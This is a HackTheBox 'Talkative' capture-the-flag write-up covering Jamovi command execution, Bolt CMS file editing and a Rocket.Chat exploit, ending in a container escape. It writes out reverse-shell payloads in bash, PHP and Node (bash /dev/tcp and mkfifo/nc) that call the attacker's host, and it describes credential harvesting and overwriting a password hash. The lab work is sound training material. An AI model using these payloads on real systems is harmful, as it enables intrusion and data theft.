# Talkative HackTheBox Writeup
### Level: `Hard` | OS: `Linux`

![logo](1.png)

## Scanning
We run nmap on ports with scripts and software versions.

![](2.png)

## Enumeration
Add the domain "*talkative.htb*" in the file "*/etc/hosts*", access to the web service

![](3.png)

We list a few users:
![](4.png)

We see that the cms is a **Bolt CMS**:
![](5.png)

On port 3000 we have a **rocket.chat**, we found nothing useful on it.

![](6.png)

On port 8080 we have a **Jamovi**:

![](7.png)

We list **Jamovi** version *0.9.5.5.5*:

![](8.png)


## Exploitation
Looking for information about this software, I find that there is an editor in the application to be able to execute commands.

```bash
system("id", intern=TRUE)
```

![](9.png)

We are trying to get up a revshell, although if we access it will probably be to a content...


```bash
system("bash -c 'bash -i >&/dev/tcp/10.10.14.32/443 0>&1'", intern=TRUE)
```

We get a connection to the server, we are effectively in a **docker**:

![](10.png)

We check the root directory, we see the **jamovi*** folder and an *.omv* file of the **Bolt** administration (remember the CMS we detected earlier).

![](11.png)

As I didn't have netcat, I encoded it in base64 and passed it to my computer.

![](12.png)

I didn't get complicated, used *grep -r* to search for keywords like "*password*", the passwords of several users came up.

![](13.png)

We tried to test the credentials found, but none of them worked.

![](14.png)

So I tried with classic users like "*root, admin...*" and the latter worked!

![](15.png)

We can't upload php files from the file upload, but we can edit existing php files, in my case I edited the "*bundles.php*" and inserted a revshell:

```bash
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.32/443 0>&1'")
```

![](16.png)

We set **netcat** to listen and we receive the connection:

![](17.png)

We see that we are in another container:

![](18.png)

**Ping** does not exist on the machine, so I did a **curl** to *172.17.0.1* and listed the web service.

![](19.png)

We test the credentials via **SSH**, get access as *saul* and read the user flag.

![](20.png)


## Privilege Escalation
We launch **linpeas.sh** and list what could be vulnerable to *SUDO* and *Polkit*.

![](21.png)

We didn't find much else, so we launch the **pspy** tool and see that a file called "*update_mongo.py*" is running as root.

![](22.png)

It looks like the **rocket.chat** one is the one running with the **mongo**, but we don't know which **docker** it is running on.

![](23.png)

So I launched a loop on the default port of **mongodb** to see the server response via a **curl**, I saw that the **mongodb** is located on the machine with IP *172.17.0.2*:

![](24.png)

We port forward port *27017* with **Chisel** so we can work locally.

![](25.png)

Connect to **mongodb** and list several databases:

![](26.png)

We access the "*meteor*" database and list the **rocket.chat** tables:

![](27.png)

We list the user "*saul*" and his password in bcrypt:

![](28.png)

We tried the three passwords we have, but none of them is valid, but as we have access to the db we could modify it for one we know by changing the hash in bcrypt:

![](29.png)

We are able to access the panel as administrator:

![](30.png)

We list the version of **rocket.chat**:

![](31.png)

Searching for the version, I found this exploit:
##### Exploit: [https://github.com/CsEnox/CVE-2021-22911](https://github.com/CsEnox/CVE-2021-22911)

Although code can also be executed from **MondoDB** integrations (which is what this exploit below does).

![](32.png)

```bash
const require = console.log.constructor('return process.mainModule.require')();
const { exec } = require('child_process');
exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.62 555 >/tmp/f');
```

We run curl and get a revshell:

![](33.png)

We transfer the **linpeas.sh** tool and run it, it shows us that we have *cap-dac-read-search* capability. Looking for information of the exploitation, I found this tool that I did not know it and I believe that it was the ideal moment after the return of the vacations to know new tools.

#### Tool: [CDK](https://github.com/cdk-team/CDK)

We see some goodness of **cdk** and we see that there is the "*cap-dac-read-search*", which comes perfectly to try to read the file *root.txt*.

![](34.png)

We run it and manage to read the file root.txt.

![](35.png)

---
## About

David Utón is Penetration Tester and security auditor for web and mobiles applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks.

#### Contacted on:

<img src='https://m3n0sd0n4ld.github.io/imgs/linkedin.png' width='40' align='center'> [David-Uton](https://www.linkedin.com/in/david-uton/)
<img src='https://m3n0sd0n4ld.github.io/imgs/twitter.png' width='43' align='center'> [@David_Uton](https://twitter.com/David_Uton)